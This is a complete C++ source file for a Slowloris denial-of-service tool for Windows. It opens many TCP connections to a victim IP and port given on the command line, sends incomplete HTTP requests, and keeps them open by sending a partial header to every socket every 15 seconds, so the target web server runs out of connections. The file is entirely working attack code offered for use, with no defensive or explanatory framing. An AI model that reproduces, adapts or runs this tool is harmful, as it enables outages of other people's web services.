#include <iostream>
#include <string>
#include <winsock2.h>
#include <vector>
#include <thread>
#include <Windows.h>

using namespace std;

#define ARGS 4

void initialSendSocket(SOCKET socketNum) {
    char incompleteHeader[255];
    sprintf(incompleteHeader, "GET /%d HTTP/1.1\r\n", (rand() % 99999));
    send(socketNum, incompleteHeader, strlen(incompleteHeader), 0);
    sprintf(incompleteHeader, "Host: \r\n");
    send(socketNum, incompleteHeader, strlen(incompleteHeader), 0);
    sprintf(incompleteHeader, "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n");
    send(socketNum, incompleteHeader, strlen(incompleteHeader), 0);
    sprintf(incompleteHeader, "Content-Length: %d\r\n", (rand() % 99999 + 1000));
    send(socketNum, incompleteHeader, strlen(incompleteHeader), 0);
}

void spamPartialHeaders(sockaddr_in victim, vector<SOCKET>& socketList, int totalSockets) {
    for (int i = 0; i < totalSockets; i++) {
        char incompleteHeader[50];
        sprintf(incompleteHeader, "X-a: %d\r\n", (rand() % 99999));
        send(socketList[i], incompleteHeader, strlen(incompleteHeader), 0);
    }
}

int main(int argc, char* argv[]) {
    if (argc != (ARGS + 1)) {
        cerr << "Usage: ./slowlorisattack.cpp <dest_ip> <dest_port_num> <num_sockets> <num_threads>" << endl;
        return 0;
    }

    const char* victimIP = argv[1];
    unsigned short victimPORT = atoi(argv[2]);
    int totalSockets = atoi(argv[3]);
    int numThreads = atoi(argv[4]);
    vector<thread> threadArray;

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        cerr << "WSAStartup failed" << endl;
        return 1;
    }

    sockaddr_in victim;
    victim.sin_family = AF_INET;
    victim.sin_port = htons(victimPORT);
    victim.sin_addr.s_addr = inet_addr(victimIP);


    vector<vector<SOCKET>> socketListPartitions;

    int socketDensity = totalSockets / numThreads;

    for (int i = 0; i < numThreads; i++) {
        vector<SOCKET> currentSocketList;
        int numSockets = (i == (numThreads - 1)) ? (socketDensity + totalSockets % numThreads) : socketDensity;
        for (int j = 0; j < numSockets; j++) {
            SOCKET newSocket = socket(AF_INET, SOCK_STREAM, 0);
            if (newSocket == INVALID_SOCKET) {
                cerr << "Could not create socket " << j + 1 << " for thread #" << i + 1 << "." << endl;
                return 1;
            }
            if (connect(newSocket, reinterpret_cast<sockaddr*>(&victim), sizeof(victim)) == SOCKET_ERROR) {
                cerr << "Could not connect socket " << j + 1 << " for thread #" << i + 1 << "." << endl;
                cerr << "Perhaps a nonexistent IP or unopened port?" << endl;
                return 1;
            }
            initialSendSocket(newSocket);
            currentSocketList.push_back(newSocket);
        }
        socketListPartitions.push_back(currentSocketList);
    }

    int iterations = 1;
    while (true) {
        cout << "Restarting attacks.." << endl;
        for (int i = 0; i < numThreads; i++) {
            cout << "Keeping sockets on thread #" << i + 1 << " open.." << endl;
            threadArray.emplace_back(spamPartialHeaders, victim, ref(socketListPartitions[i]), static_cast<int>(socketListPartitions[i].size()));
            cout << "Attacks were successful on thread #" << i + 1 << "." << endl;
        }

        for (int i = 0; i < numThreads; i++) {
            threadArray[i].join();
            cout << "Attacks on thread #" << i + 1 << " paused." << endl;
        }

        cout << "Iteration " << iterations << " completed." << endl;
        iterations++;
        cout << "Sleeping for 15 seconds... " << endl;
        Sleep(15000); // Sleep for 15 seconds
        cout << "------------" << endl;
    }

    WSACleanup();
    return 0;
}
